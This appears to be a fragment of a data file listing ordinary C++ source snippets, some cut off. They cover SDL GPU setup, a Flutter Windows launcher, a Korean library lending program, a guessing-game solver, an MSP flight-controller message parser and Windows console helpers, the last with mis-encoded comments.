SDL_GPU_TEXTUREFORMAT_D32_FLOAT_S8_UINT;\n\telse\n\t\tthrow SDLException{\"Couldn't find a suitable depth stencil format\"};\n\n\tauto vertexShader{LoadShader(device, \"TexturedQuadWithMatrix.vert\", 0, 1, 0, 0)};\n\tif (!vertexShader)\n\t\tthrow SDLException{\"Couldn't load vertex shader\"};\n\n\tauto fragmentShader{LoadShader(device, \"TexturedQuad.frag\", 1, 0, 0, 0)};\n\tif (!fragmentShader)\n\t\tthrow SDLException{\"Couldn't load fragment shader\"};\n\n\tSDL_GPUSampleCount msaaSampleCount{SDL_GPU_SAMPLECOUNT_8};\n\n\tstd::array colorTargetDescriptions{\n\t\tSDL_GPUColorTargetDescription{\n\t\t\t.format = SDL_GetGPUSwapchainTextureFormat(device, window),\n\t\t},\n\t};\n\tstd::array<SDL_GPUVertexAttribute,",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quiz_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include \"Basic.h\"\n#include \"BasicChallenge.h\"\n\n\n\n\n\n\n\n\nint main() {\n\n    BookManager manager;\n    BorrowManager user;\n\n    // \ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\uc758 \uae30\ubcf8 \uba54\ub274\ub97c \ubc18\ubcf5\uc801\uc73c\ub85c \ucd9c\ub825\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4.\n    // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\ub97c \uc120\ud0dd\ud558\uae30 \uc804\uae4c\uc9c0 \uacc4\uc18d \ub3d9\uc791\ud569\ub2c8\ub2e4.\n    while (true) {\n        cout << \"\\n\ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\" << endl;\n        cout << \"1. \ucc45 \ucd94\uac00\" << endl; // \ucc45 \uc815\ubcf4\ub97c \uc785\ub825\ubc1b\uc544 \ucc45 \ubaa9\ub85d\uc5d0 \ucd94\uac00\n        cout << \"2. \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n        cout << \"3. \ucc45 \uc81c\ubaa9\uc73c\ub85c \ucc45 \ucc3e\uae30\" << endl; // \ucc45 \uc81c\ubaa9\uc73c\ub85c \ucc45 \ucc3e\uae30\n        cout << \"4. \uc800\uc790\uc774\ub984\uc73c\ub85c \ucc45 \ucc3e\uae30\" << endl; // \uc800\uc790\uc774\ub984\uc73c\ub85c \ucc45 \ucc3e\uae30\n        cout << \"5. \ucc45 \uc81c\ubaa9\uc73c\ub85c \ucc45 \ub300\uc5ec\" << endl; // \ucc45 \uc81c\ubaa9\uc73c\ub85c \ucc45 \ub300\uc5ec\n        cout << \"6. \ucc45 \uc800\uc790\uc73c\ub85c \ucc45 \ub300\uc5ec\" << endl; // \ucc45 \uc800\uc790\uc73c\ub85c \ucc45 \ub300\uc5ec\n        cout << \"7. \ucc45 \uc81c\ubaa9\uc73c\ub85c \ucc45 \ubc18\ud658\" << endl; // \ucc45 \uc81c\ubaa9\uc73c\ub85c \ucc45 \ubc18\ud658\n        cout << \"8. \ub300\uc5ec\ud55c \ucc45 \ubaa9\ub85d\" << endl; // \ub300\uc5ec\ud55c \ucc45 \ubaa9\ub85d\n        cout << \"9. \uc885\ub8cc\" << endl; // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\n        cout << \"\uc120\ud0dd: \";\n\n        int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\n        cin >> choice;\n\n        if (choice == 1) {\n            // 1\ubc88 \uc120\ud0dd: \ucc45 \ucd94\uac00\n            // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \ucc45 \uc81c\ubaa9\uacfc \uc800\uc790\uba85\uc744 \uc785\ub825\ubc1b\uc544 BookManager\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\n            string title, author;\n            cout << \"\ucc45 \uc81c\ubaa9: \";\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n            getline(cin, title); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            cout << \"\ucc45 \uc800\uc790: \";\n            getline(cin, author); // \uc800\uc790\uba85 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            manager.addBook(title, author); // \uc785\ub825\ubc1b\uc740 \ucc45 \uc815\ubcf4\ub97c \ucd94\uac00\n        }\n        else if (choice == 2) {\n            // 2\ubc88 \uc120\ud0dd: \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n            // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            manager.displayAllBooks();\n        }\n        else if (choice == 3)\n        {\n            // 3\ubc88 \uc120\ud0dd : \uac80\uc0c9\n            // \ud0c0\uc774\ud2c0\uc5d0 \ub9de\ub294 \ucc45 \ucc3e\uae30\n            string title;\n            cout << \"\ucc3e\uace0 \uc2f6\uc740 \ucc45 \uc81c\ubaa9 : \";\n            cin.ignore();\n            getline(cin, title);\n            manager.searchByTitle(title);\n\n\n        }\n        else if (choice == 4)\n        {\n            // 4\ubc88 \uc120\ud0dd : \uac80\uc0c9\n            // \uc800\uc790\uc5d0 \ub9de\ub294 \ucc45 \ucc3e\uae30\n            string author;\n            cout << \"\ucc3e\uace0 \uc2f6\uc740 \ucc45\uc758 \uc800\uc790 : \";\n            cin.ignore();\n            getline(cin, author);\n            manager.searchByAuthor(author);\n\n\n        }\n        else if (choice == 5)\n        {\n            // 5\ubc88 \uc120\ud0dd : \ucc45 \ub300\uc5ec -\ucc45 \uc81c\ubaa9\n            // \uc81c\ubaa9\uc5d0 \ub9de\ub294 \ucc45 \ucc3e\uae30\n            string title;\n            cout << \"\ucc3e\uace0 \uc2f6\uc740 \ucc45\uc758 \uc81c\ubaa9 : \";\n            cin.ignore();\n            getline(cin, title);\n            if (manager.searchByTitle(title)) {\n                //\ud5d0 ? &*\ub294 \uc591\uc2ec\n                //optional\uc740 \ud3ec\uc778\ud130\ucc98\ub7fc \uac12\uc744\uc804\ub2ec\ud558\ub824\uba74 *\ub97c \uc0ac\uc6a9\ud574\uc57c\ud55c\ub2e4 ... \uc8fc\uc758!!\n                //user.borrowBook(&*manager.findBookByTitle(title));\n\n                // & \uc5f0\uc0b0\uc790\uc5d0 l-value(\uba54\ubaa8\ub9ac\uc5d0 \uc800\uc7a5\ub41c \uac12\uc744 \uac00\ub9ac\ud0a4\ub294 \ubcc0\uc218\ub098 \uac1d\uccb4)\uac00 \ud544\uc694\ud558\ub2e4\ub294 \uc758\ubbf8\n                // \uc989, & \uc5f0\uc0b0\uc790\uac00 \uc0ac\uc6a9\ub41c \uc704\uce58\uc5d0\uc11c \uc8fc\uc18c\ub97c \uac00\uc838\uc62c \uc218 \uc5c6\ub294 \uac12\uc774 \uc788\ub2e4\ub294 \ub73b\n\n                if (auto book = manager.findBookByTitle(title)) {\n                    Book& bookRef = *book; // Book \uac1d\uccb4\uc758 \ucc38\uc870\ub97c \uc5bb\uc74c\n                    cout << bookRef.title << bookRef.author << \"\ube4c\ub824\uc62c \ucc45 \uc774\ub984\uacfc \uc800\uc11c ... \\n\";\n                    //user.borrowBook(&bookRef); // \ucc38\uc870\uc758 \uc8fc\uc18c\ub97c \uc804\ub2ec\n                    user.borrowBook(new Book(bookRef)); // \ucc38\uc870\uc758 \uc8fc\uc18c\ub97c \uc804\ub2ec\n                   // delete& bookRef;\n                }\n            }\n            else {\n                cout << \"\ud574\ub2f9 \ucc45\uc740 \uc5c6\uc2b5\ub2c8\ub2e4.\";\n            }\n\n\n        }\n        else if (choice == 6)\n        {\n            // 5\ubc88 \uc120\ud0dd : \ucc45 \ub300\uc5ec -\ucc45 \uc800\uc790\n            // \uc800\uc790\uc5d0 \ub9de\ub294 \ucc45 \ucc3e\uae30\n            string author;\n            cout << \"\ucc3e\uace0 \uc2f6\uc740 \ucc45\uc758 \uc800\uc790 : \";\n            cin.ignore();\n            getline(cin, author);\n\n\n            //\uac12\uc744 \ubc1b\uace0 \uac70\uae30\uc11c \ub610 \uc8fc\uc18c\ub85c \ubc14\uafbc\ub2e4 &*\ub97c \uc774\ub807\uac8c \ud480\uc5b4\uc11c \uc0ac\uc6a9\ud574\uc57c \uc624\ub958\uc5c6\ub294 \ub4ef\ud568.\n            if (manager.searchByAuthor(author)) {                \n                if (auto book = manager.findBookByAuthor(author)) {\n                    Book& bookRef = *book; // Book \uac1d\uccb4\uc758 \ucc38\uc870\ub97c \uc5bb\uc74c\n                    cout << bookRef.title << bookRef.author << \"\ube4c\ub824\uc62c \ucc45 \uc774\ub984\uacfc \uc800\uc11c ... \\n\";\n                    user.borrowBook(new Book(bookRef)); // \ucc38\uc870\uc758 \uc8fc\uc18c\ub97c \uc804\ub2ec\n                    //delete& bookRef;\n                }\n            }\n            else {\n                cout << \"\ud574\ub2f9 \ucc45\uc740 \uc5c6\uc2b5\ub2c8\ub2e4.\";\n            }\n\n        }\n        else if (choice == 7)\n        {\n            string title;\n            cout << \"\ubc18\ub0a9\ud560 \ucc45\uc758 \uc81c\ubaa9 : \";\n            cin.ignore();\n            getline(cin, title);\n            if (auto book = user.returnbook(title))\n            {\n                Book& bookRef = *book;\n                manager.addBook(bookRef.title, bookRef.author);\n                //delete &bookRef;\n            }\n            \n        }\n        else if (choice == 8) {\n            // 2\ubc88 \uc120\ud0dd: \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n            // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            user.displayStock();\n        }\n        else if (choice == 9) {\n            // 5\ubc88 \uc120\ud0dd: \uc885\ub8cc\n            // \ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud558\uace0 \uc0ac\uc6a9\uc790\uc5d0\uac8c \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\n            break; // while \ub8e8\ud504 \uc885\ub8cc\n        }\n        \n        else {\n            // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\n            // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\n        }\n    }\n\n    return 0; // \ud504\ub85c\uadf8\ub7a8 \uc815\uc0c1 \uc885\ub8cc\n\t\n}",
    "#include <iostream>\n\nusing namespace std;\n\nstruct numar{\n    int id;\n}v[11];\n\nint main()\n{\n    int nr[5] = {-1, -1, -1, -1, -1}, cnt_k = 0, cnt = 0, i = 0, guesses = 0;\n    int zero = 0;\n    bool ok, ok_nr;\n    for(int j = 0; j <= 9; j++)\n    {\n        v[j].id = 0;\n    }\n    ok = 1;\n    i = 0;\n    do\n    {\n        int cnt2;\n        int j = 4;\n        if(i != 9 && (cnt != 4 || zero == 0))\n        {\n            cout << \"new guess: \";\n            guesses++;\n            while(j)\n            {\n                cout << i;\n                j--;\n            }\n            cout << '\\n';\n            cin >> cnt2;\n            cnt += cnt2;\n            v[i].id = cnt2;\n            if(cnt == 4 && zero == 0)\n            {\n                v[++i].id = -1;\n                zero++;\n            }\n        }\n        else\n        {\n            if(cnt < 4)\n            {\n                v[9].id = 4 - cnt;\n                cnt = 4;\n                cnt2 = 4 - cnt;\n            }\n        }\n            if(cnt == 4 && cnt2 != 4)\n            {\n                if(zero > 0)\n                {\n                    int index = 0;\n                    cnt_k = 0;\n                    while(index <= 9)\n                    {\n                        if(v[index].id > 0)\n                        {\n                            int p;\n                            for(p = 0; p < 9; p++)\n                                if(v[p].id == -1)\n                                    break;\n                            if(nr[1] == -1 && cnt_k < 4)\n                            {\n                                ok_nr = 0;\n                                if(nr[2] != -1 && nr[3] != -1 && nr[4] != -1)\n                                {\n                                    nr[1] = index;\n                                    v[index].id--;\n                                    cnt_k++;\n                                }\n                                else if(nr[4] != -1 && v[index].id == 3)\n                                {\n                                    nr[1] = index;\n                                    nr[2] = index;\n                                    nr[3] = index;\n                                    v[index].id = 0;\n                                    cnt_k += 3;\n                                }\n                                else if(nr[2] != -1 && nr[3] != -1 && nr[4] != -1 && v[index].id == 1)\n                                {\n                                    nr[1] = index;\n                                    v[index].id = 0;\n                                    cnt_k++;\n                                }\n                                else if(nr[3] != -1 && nr[4] != -1 && nr[2] == -1 && v[index].id == 2)\n                                {\n                                    nr[1] = index;\n                                    nr[2] = index;\n                                    v[index].id = 0;\n                                    cnt_k += 2;\n                                }\n                                else if(nr[2] != -1 && nr[4] != -1 && v[index].id == 2)\n                                {\n                                    nr[1] = index;\n                                    nr[3] = index;\n                                    v[index].id = 0;\n                                    cnt_k += 2;\n                                }\n                                else\n                                {\n                                    cout << \"new guess: \";\n                                    guesses++;\n                                    cout << index << p << p << p << '\\n';\n                                    cin >> ok_nr;\n                                    if(ok_nr == 1)\n                                    {\n                                        nr[1] = index;\n                                        cnt_k++;\n                                        v[index].id--;\n                                    }\n                                }\n                            }\n                            if(nr[2] == -1 && cnt_k < 4 && v[index].id != 0)\n                            {\n                                ok_nr = 0;\n                                if(v[index].id == 3)\n                                {\n                                    nr[2] = index;\n                                    nr[3] = index;\n                                    nr[4] = index;\n                                    v[index].id = 0;\n                                    cnt_k += 3;\n                                }\n                                else if(nr[4] != -1 && nr[3] == -1 && v[index].id == 2)\n                                {\n                                    nr[2] = index;\n                                    nr[3] = index;\n                                    v[index].id = 0;\n                                    cnt_k += 2;\n                                }\n                                else if(nr[1] != -1 && nr[3] != -1 && nr[4] != -1 && v[index].id == 1)\n                                {\n              ",
    "#include <iostream>\n#include <fstream>\n#include <cstdint>\n#include <cstring>\n#include <map>\n#include <memory>\n#include <vector>\n#include <stdexcept>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n\nusing namespace std;\n\n/******************************************************************************\n *                            Constants & Enums\n ******************************************************************************/\nstatic const int  MSP_MAX_PAYLOAD_SIZE = 256;\nstatic const int  FRAME_BUFFER_SIZE    = 1024;\nstatic const int  CHANNEL_COUNT        = 18;\n\n/**\n * Known MSP commands as a strongly typed enum.\n */\nenum class MspCommand : uint8_t {\n    STATUS     = 101,\n    ATTITUDE   = 108,\n    RC         = 105,\n    FC_VARIANT = 102,\n    UNKNOWN    = 255 // fallback\n};\n\n/******************************************************************************\n *                           Data Model (Shared State)\n *\n * This struct holds data from the flight controller.\n * Nothing else manipulates how it's stored or interpreted (besides executors).\n ******************************************************************************/\nstruct FlightDataModel {\n    bool     armed               { false };\n    int16_t  pitch               { 0 };\n    int16_t  roll                { 0 };\n    int16_t  heading             { 0 };\n    uint16_t channels[CHANNEL_COUNT] {};\n    char     fcIdentifier[5]     {};  // 4 chars + null terminator\n\n    bool     verbose            { true };\n};\n\n/******************************************************************************\n *                         MSP Message Representation\n ******************************************************************************/\nstruct MspMessage {\n    enum class Direction : uint8_t {\n        OUTBOUND,\n        INBOUND\n    };\n\n    Direction direction { Direction::OUTBOUND };\n    MspCommand cmd      { MspCommand::UNKNOWN };\n    uint8_t    size     { 0 };\n    uint8_t    checksum { 0 };\n    uint8_t    payload[MSP_MAX_PAYLOAD_SIZE] {};\n};\n\n/******************************************************************************\n *                            Handler Interface\n ******************************************************************************/\nclass IMspMessageHandler {\npublic:\n    virtual ~IMspMessageHandler() = default;\n    virtual void onMspMessage(const MspMessage& msg) = 0;\n};\n\n/**\n * Interface for MSP command executors.\n * Each executor handles exactly one type of command (Single Responsibility).\n */\nclass IMspCommandExecutor {\npublic:\n    virtual ~IMspCommandExecutor() = default;\n    virtual void execute(const MspMessage& msg, FlightDataModel& dataModel) = 0;\n};\n\n/******************************************************************************\n *                           MSP Message Parser\n *\n * Receives raw bytes, reconstructs MspMessage objects, and notifies a handler\n * when a message is fully parsed.\n ******************************************************************************/\nclass MspMessageParser {\npublic:\n    explicit MspMessageParser(IMspMessageHandler& handler)\n        : m_handler(handler)\n    {\n        reset();\n    }\n\n    /**\n     * Possible states of the MSP parser state machine.\n     */\n    enum class ParserState {\n        IDLE,\n        VERSION,\n        DIRECTION,\n        SIZE,\n        CMD,\n        PAYLOAD,\n        CHECKSUM\n    };\n\n    /**\n     * Processes a single byte from the input stream.\n     */\n    void processByte(uint8_t byte) {\n        switch (m_state) {\n        case ParserState::IDLE:\n            if (byte == '$') {\n                m_state = ParserState::VERSION;\n            }\n            break;\n\n        case ParserState::VERSION:\n            if (byte == 'M') {\n                m_state = ParserState::DIRECTION;\n            } else {\n                reset();\n            }\n            break;\n\n        case ParserState::DIRECTION:\n            if (byte == '<') {\n                m_msg.direction = MspMessage::Direction::OUTBOUND;\n            } else if (byte == '>') {\n                m_msg.direction = MspMessage::Direction::INBOUND;\n            } else {\n                reset();\n                break;\n            }\n            m_state = ParserState::SIZE;\n            break;\n\n        case ParserState::SIZE:\n            m_msg.size     = byte;\n            m_msg.checksum = byte; // initial checksum includes size\n            m_msg.cmd      = MspCommand::UNKNOWN;\n            m_bufPtr       = 0;\n            if (m_msg.size > MSP_MAX_PAYLOAD_SIZE) {\n                reset();\n            } else {\n                m_state = ParserState::CMD;\n            }\n            break;\n\n        case ParserState::CMD:\n            m_msg.checksum ^= byte;\n            m_msg.cmd       = toMspCommand(byte);\n            m_bufPtr        = 0;\n            // If size == 0, we move directly to CHECKSUM\n            m_state = (m_msg.size == 0) ? ParserState::CHECKSUM : ParserState::PAYLOAD;\n            break;\n\n        case ParserState::PAYLOAD:\n     ",
    "#include \"ConsoleTools.h\"\n\n// \u00cc\u00e0\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00ea\u00ee\u00e4, \u00f3\u00f1\u00f2\u00e0\u00ed\u00e0\u00e2\u00eb\u00e8\u00e2\u00e0\u00fe\u00f9\u00e8\u00e9 \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8, \u00ef\u00ee\u00eb\u00ee\u00e6\u00e5\u00ed\u00e8\u00e5 \u00e8 \u00ec\u00ee\u00ed\u00ee\u00f8\u00e8\u00f0\u00e8\u00ed\u00ed\u00fb\u00e9 \u00f8\u00f0\u00e8\u00f4\u00f2\nvoid SetConsoleProperties(int cellWidth, int cellHeight, int width, int height) {\n    // \u00cf\u00ee\u00eb\u00f3\u00f7\u00e0\u00e5\u00ec \u00e4\u00e5\u00f1\u00ea\u00f0\u00e8\u00ef\u00f2\u00ee\u00f0 \u00f1\u00f2\u00e0\u00ed\u00e4\u00e0\u00f0\u00f2\u00ed\u00ee\u00e3\u00ee \u00e2\u00fb\u00e2\u00ee\u00e4\u00e0\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    // \u00d3\u00f1\u00f2\u00e0\u00ed\u00e0\u00e2\u00eb\u00e8\u00e2\u00e0\u00e5\u00ec \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00ee\u00ea\u00ed\u00e0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8\n    SMALL_RECT windowSize;\n    windowSize.Left = 0;\n    windowSize.Top = 0;\n    windowSize.Right = width - 1;\n    windowSize.Bottom = height - 1;\n\n    // \u00c7\u00e0\u00e4\u00e0\u00b8\u00ec \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00ee\u00ea\u00ed\u00e0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8\n    if (!SetConsoleWindowInfo(hConsole, TRUE, &windowSize)) {\n        std::cerr << \"\u00cd\u00e5 \u00f3\u00e4\u00e0\u00eb\u00ee\u00f1\u00fc \u00f3\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00e8\u00f2\u00fc \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00ee\u00ea\u00ed\u00e0!\" << std::endl;\n        return;\n    }\n\n    // \u00d3\u00f1\u00f2\u00e0\u00ed\u00e0\u00e2\u00eb\u00e8\u00e2\u00e0\u00e5\u00ec \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00e1\u00f3\u00f4\u00e5\u00f0\u00e0\n    COORD bufferSize;\n    bufferSize.X = width;\n    bufferSize.Y = height;\n\n    if (!SetConsoleScreenBufferSize(hConsole, bufferSize)) {\n        std::cerr << \"\u00cd\u00e5 \u00f3\u00e4\u00e0\u00eb\u00ee\u00f1\u00fc \u00f3\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00e8\u00f2\u00fc \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00e1\u00f3\u00f4\u00e5\u00f0\u00e0!\" << std::endl;\n        return;\n    }\n\n    // \u00d3\u00f1\u00f2\u00e0\u00ed\u00e0\u00e2\u00eb\u00e8\u00e2\u00e0\u00e5\u00ec \u00ec\u00ee\u00ed\u00ee\u00f8\u00e8\u00f0\u00e8\u00ed\u00ed\u00fb\u00e9 \u00f8\u00f0\u00e8\u00f4\u00f2\n    CONSOLE_FONT_INFOEX fontInfo = { 0 };\n    fontInfo.cbSize = sizeof(fontInfo);\n    fontInfo.nFont = 0;\n    fontInfo.dwFontSize.X = cellWidth; // \u00d8\u00e8\u00f0\u00e8\u00ed\u00e0 \u00f1\u00e8\u00ec\u00e2\u00ee\u00eb\u00e0\n    fontInfo.dwFontSize.Y = cellHeight; // \u00c2\u00fb\u00f1\u00ee\u00f2\u00e0 \u00f1\u00e8\u00ec\u00e2\u00ee\u00eb\u00e0\n    fontInfo.FontFamily = FF_DONTCARE;\n    fontInfo.FontWeight = FW_NORMAL;\n    wcscpy_s(fontInfo.FaceName, L\"Consolas\"); // \u00d3\u00f1\u00f2\u00e0\u00ed\u00e0\u00e2\u00eb\u00e8\u00e2\u00e0\u00e5\u00ec \u00f8\u00f0\u00e8\u00f4\u00f2 \"Consolas\"\n    if (!SetCurrentConsoleFontEx(hConsole, FALSE, &fontInfo)) {\n        std::cerr << \"\u00cd\u00e5 \u00f3\u00e4\u00e0\u00eb\u00ee\u00f1\u00fc \u00f3\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00e8\u00f2\u00fc \u00f8\u00f0\u00e8\u00f4\u00f2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8!\" << std::endl;\n    }\n\n    // \u00d6\u00e5\u00ed\u00f2\u00f0\u00e8\u00f0\u00f3\u00e5\u00ec \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc \u00ed\u00e0 \u00fd\u00ea\u00f0\u00e0\u00ed\u00e5\n    HWND consoleWindow = GetConsoleWindow();\n    RECT desktop;\n    GetWindowRect(GetDesktopWindow(), &desktop); // \u00cf\u00ee\u00eb\u00f3\u00f7\u00e0\u00e5\u00ec \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0 \u00fd\u00ea\u00f0\u00e0\u00ed\u00e0\n    int screenWidth = desktop.right;\n    int screenHeight = desktop.bottom;\n\n    // \u00c2\u00fb\u00f7\u00e8\u00f1\u00eb\u00ff\u00e5\u00ec \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0\u00fb \u00ee\u00ea\u00ed\u00e0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8 \u00e2 \u00ef\u00e8\u00ea\u00f1\u00e5\u00eb\u00ff\u00f5\n    int consolePixelWidth = cellWidth * width;\n    int consolePixelHeight = cellHeight * height;\n\n    // \u00d6\u00e5\u00ed\u00f2\u00f0\u00e8\u00f0\u00f3\u00e5\u00ec\n    int x = (screenWidth - consolePixelWidth) / 2;\n    int y = (screenHeight - consolePixelHeight) / 2;\n\n    // TODO \u00ef\u00ee\u00f7\u00e8\u00ed\u00e8\u00f2\u00fc \u00fd\u00f2\u00f3 \u00f2\u00f3\u00ef\u00f3\u00fe \u00e7\u00e0\u00eb\u00f3\u00ef\u00f3 \u00f1 +100\n    MoveWindow(consoleWindow, x, y, consolePixelWidth + 30, consolePixelHeight + 100, TRUE);\n}\n\n// \u00cc\u00e0\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00ea\u00ee\u00e4, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00e7\u00e0\u00e4\u00e0\u00e5\u00f2 \u00f6\u00e2\u00e5\u00f2 \u00f4\u00ee\u00ed\u00e0 \u00e8 \u00f2\u00e5\u00ea\u00f1\u00f2\u00e0\nvoid SetColor(TextColor text, BackgroundColor background) {\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    SetConsoleTextAttribute(hConsole, text | background);\n}\n\n// \u00cc\u00e0\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00ea\u00ee\u00e4, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00ef\u00e5\u00f0\u00e5\u00ed\u00ee\u00f1\u00e8\u00f2 \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0\nvoid MoveCursorToCoordinates(int a, int b) {\n    COORD coord = { b, a };\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\n}\n\n// \u00cc\u00e0\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00ea\u00ee\u00e4, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00ef\u00f0\u00ff\u00f7\u00e5\u00f2 \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8\nvoid HideCursor() {\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    CONSOLE_CURSOR_INFO cursorInfo;\n    GetConsoleCursorInfo(hConsole, &cursorInfo);\n    cursorInfo.bVisible = FALSE;  // \u00ce\u00f2\u00ea\u00eb\u00fe\u00f7\u00e0\u00e5\u00ec \u00e2\u00e8\u00e4\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0\u00e0\n    SetConsoleCursorInfo(hConsole, &cursorInfo);\n}\n\n// \u00cc\u00e0\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00ea\u00ee\u00e4, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00ef\u00ee\u00ea\u00e0\u00e7\u00fb\u00e2\u00e0\u00e5\u00f2 \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8\nvoid ShowCursor() {\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    CONSOLE_CURSOR_INFO cursorInfo;\n    GetConsoleCursorInfo(hConsole, &cursorInfo);\n    cursorInfo.bVisible = TRUE;  // \u00c2\u00ea\u00eb\u00fe\u00f7\u00e0\u00e5\u00ec \u00e2\u00e8\u00e4\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0\u00e0\n    SetConsoleCursorInfo(hConsole, &cursorInfo);\n}",
